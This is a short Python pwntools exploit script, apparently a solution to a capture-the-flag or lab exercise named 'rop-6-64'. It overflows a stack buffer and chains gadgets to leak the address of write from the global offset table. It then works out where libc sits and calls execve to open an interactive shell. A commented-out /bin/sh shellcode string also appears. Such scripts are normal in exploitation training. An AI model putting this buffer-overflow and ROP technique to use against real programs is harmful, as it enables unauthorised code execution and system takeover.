#!/usr/bin/env python
from pwn import *

p = process("./rop-6-64")
#SHELLCODE = 'jlX\x0f\x05H\x89\xc7H\x89\xc6jrX\x0f\x05H1\xf6H1\xd2j;XH\xbb//bin/shVSH\x89\xe7\x0f\x05'

#context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(p)

got_of_write = p.elf.got['write']
write_at_plt = p.elf.plt['write']
input_func = p.elf.symbols['input_func']

print("Got of write %s" % hex(got_of_write))
print("write@plt %s" % hex(write_at_plt))
print("input_func() %s" % hex(input_func))
writey = p64(0x4004a0)
readey = p64(0x4004b0)

'0x0000000000400763 : pop rdi ; ret'
pop_rdi = p64(0x400703)
pop_rsi = p64(0x400701)

dest = p64(0x601000)

buf = "A" * 0x80 + "B" * 8

buf += pop_rdi + p64(1)
buf += pop_rsi + p64(got_of_write) + p64(0)
buf += writey
buf += p64(input_func)

#with open("somthing.txt", "wb") as f:
    #f.write(buf)

p.sendline(buf)
p.recv(25)
data = p.recv(8)
print(data)
libc_write = u64(data)
#libc_write &= 0x0000ffffffffffff
print(hex(libc_write))

#gdb /lib/x86_64-linux-gnu/libc.so.6

offset = libc_write - 0xf72b0

libc_execve = offset + 0xcc770

buf = "A" * 0x80 + "B" * 8
#r12 - 15
buf += p64(0x4006fc)
# 0x400020:"@"
buf += p64(libc_execve)
buf += p64(0)
buf += p64(0)
buf += p64(0x400020)
#call r12, rbx, 8*0
buf += p64(0x4006e0)
buf += p64(0)

p.sendline(buf)
p.interactive()
